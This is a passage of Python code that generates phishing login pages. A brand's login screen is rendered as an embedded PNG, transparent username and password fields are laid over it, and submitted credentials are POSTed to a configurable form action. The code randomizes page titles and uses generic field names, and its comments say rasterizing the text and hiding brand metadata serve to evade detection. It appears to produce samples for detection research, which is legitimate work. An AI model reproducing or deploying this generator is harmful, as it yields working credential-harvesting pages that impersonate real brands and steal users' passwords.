        "username_box": (inner_x, field1_y, field_w, field_h),
        "password_box": (inner_x, field2_y, field_w, field_h),
        "button_box": (inner_x, button_y, field_w, button_h),
        "image_format": "png",
        "raster_text_ground_truth": raster_text_ground_truth,
    }
    return buffer.getvalue(), geometry


def _box_to_percent(box: tuple[int, int, int, int], width: int, height: int) -> dict:
    """Convert absolute image coordinates to viewport-relative percentages."""
    x, y, w, h = box
    return {
        "left": x / width * 100,
        "top": y / height * 100,
        "width": w / width * 100,
        "height": h / height * 100,
    }


def _style_from_percent(box: dict) -> str:
    return (
        f"left:{box['left']:.6f}%;top:{box['top']:.6f}%;"
        f"width:{box['width']:.6f}%;height:{box['height']:.6f}%;"
    )


def build_screenshot_overlay_page(
    brand: dict,
    form_action: str,
    hidden_fields_html: str = "",
    platform_url: str = "",
) -> str | tuple[str, dict]:
    """
    Build a realistic raster-screenshot phishing page.

    Unlike the old CSS imitation, this implementation embeds an actual PNG.
    All visible brand and login text is rasterized into image pixels. The DOM
    contains only a full-viewport image and transparent form controls positioned
    over the image's field and button coordinates.

    No OCR is performed here. OCR belongs in a later preprocessing or inference
        pipeline. Because this generator created the pixels, it also records the exact
    text intentionally rasterized into the image as ``raster_text_ground_truth``.

    (html_string, {"raster_text_ground_truth": ...})

    """
    png_bytes, geometry = render_login_screenshot_asset(brand)
    encoded = base64.b64encode(png_bytes).decode("ascii")
    image_src = f"data:image/png;base64,{encoded}"

    width = geometry["viewport_width"]
    height = geometry["viewport_height"]
    username_box = _box_to_percent(geometry["username_box"], width, height)
    password_box = _box_to_percent(geometry["password_box"], width, height)
    button_box = _box_to_percent(geometry["button_box"], width, height)

    # PHRASES
    TITLE_PHRASES = [
    # Brand + Sign In / Login
    f"{brand['name']} - Sign In",
    f"{brand['name']} - Login",
    f"{brand['name']} Sign In",
    f"{brand['name']} Login",
    f"{brand['name']} | Sign In",
    f"{brand['name']} | Login",
    f"Sign in to {brand['name']}",
    f"Sign In to {brand['name']}",
    f"Login to {brand['name']}",
    f"Log in to {brand['name']}",
    f"Log In to {brand['name']}",
    f"Sign into {brand['name']}",
    f"Log into {brand['name']}",

    # Account / Portal variants
    f"{brand['name']} Account",
    f"{brand['name']} Account Login",
    f"{brand['name']} Account Sign In",
    f"My {brand['name']} Account",
    f"{brand['name']} Portal",
    f"{brand['name']} Account Portal",
    "Account Portal",
    "Secure Account Portal",
    "User Account Portal",

    # Short / generic
    "Sign In",
    "Sign in",
    "Login",
    "Log In",
    "Log in",
    "Sign-In",
    "Log-In",

    # Authorization / SSO style
    f"{brand['name']} Authorization",
    f"{brand['name']} Authentication",
    f"Authorize {brand['name']}",
    f"{brand['name']} SSO",
    f"{brand['name']} Single Sign-On",
    f"Sign in with {brand['name']}",
    f"Log in with {brand['name']}",

    # Security / Verify themed
    f"Secure Sign In - {brand['name']}",
    f"Verify your {brand['name']} account",
    f"Confirm your {brand['name']} identity",
    f"{brand['name']} Identity Verification",
    f"Secure Login - {brand['name']}",

    # Common phishing-style / generic portal titles
    "Account Login",
    "Account Sign In",
    "Member Login",
    "User Login",
    "Client Login",
    "Customer Login",
    "Secure Login",
    "Secure Sign In",
    "Access Your Account",
    "Access Account",
    "Sign In to Your Account",
    "Log In to Your Account",
]

    # Randomize titles
    title = random.choice(TITLE_PHRASES)

    # Generic field names avoid leaking the imitated brand through DOM metadata.
    # The password input type remains because the attack still captures a password.
    html = textwrap.dedent(f"""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            <style>
                * {{ box-sizing: border-box; }}
                html, body {{
                    width: 100%;
                    height: 100%;
                    margin: 0;
                    overflow: hidden;
                    background: #ffffff;
                }}
                .page-raster {{
                    position: fixed;
                    inset: 0;
                    width: 100vw;
                    height: 100vh;
                    object-fit: fill;
                    z-index: 1;
                    user-select: none;
                    pointer-events: none;
                }}
                .capture-form {{
                    position: fixed;
                    inset: 0;
                    width: 100vw;
                    height: 100vh;
                    z-index: 10;
                    margin: 0;
                    padding: 0;
                }}
                .capture-control {{
                    position: absolute;
                    margin: 0;
                    padding: 0 12px;
                    border: 0;
                    border-radius: 7px;
                    outline: none;
                    background: transparent;
                    color: #202124;
                    caret-color: #202124;
                    font: 15px -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                    z-index: 11;
                }}
                .capture-control:focus {{
                    box-shadow: inset 0 0 0 2px rgba(26, 115, 232, 0.85);
                }}
                .capture-submit {{
                    position: absolute;
                    margin: 0;
                    padding: 0;
                    border: 0;
                    border-radius: 7px;
                    background: transparent;
                    cursor: pointer;
                    z-index: 11;
                }}
            </style>
        </head>
        <body>
            <img class="page-raster" src="{image_src}" alt="" draggable="false">
            <form class="capture-form" action="{form_action}" method="POST">
                <input class="capture-control" style="{_style_from_percent(username_box)}"
                       type="text" name="field_1" autocomplete="off" autofocus>
                <input class="capture-control" style="{_style_from_percent(password_box)}"
                       type="password" name="field_2" autocomplete="off">
                {hidden_fields_html}
                <button class="capture-submit" style="{_style_from_percent(button_box)}"
                        type="submit" aria-label=""></button>
            </form>
        </body>
        </html>""")
    return html, {
        "raster_text_ground_truth": geometry["raster_text_ground_truth"],
    }
